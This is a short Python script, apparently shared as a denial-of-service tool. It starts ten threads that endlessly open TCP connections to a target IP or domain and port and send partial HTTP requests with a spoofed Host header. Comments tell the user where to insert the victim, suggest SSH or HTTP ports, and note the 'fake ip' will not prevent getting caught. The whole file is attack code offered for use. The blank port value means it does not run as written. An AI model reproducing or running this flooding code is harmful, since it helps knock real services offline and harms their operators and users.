import threading
import socket

target = '' #Insert the ip you want to DOS here (website domains also work)
port =  #(Insert the port [ex: port = 22]) Port 22: DOS the SSH servers, Port 80: DOS the HTTP servers
fake_ip = '' #Insert your fake ip here (note: this will not prevent you from getting caught)

connectedCount = 0;

def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
        s.close()

        #You can uncomment the lines below to print out how many times this code is ran, but it will slow down the script.
        #global connectedCount
        #connectedCount += 1
        #print(connectedCount)

for i in range(10): #Insert how many threads you want to run (note: python does not support multithreading, it is being simulated)
    thread = threading.Thread(target=attack)
    thread.start()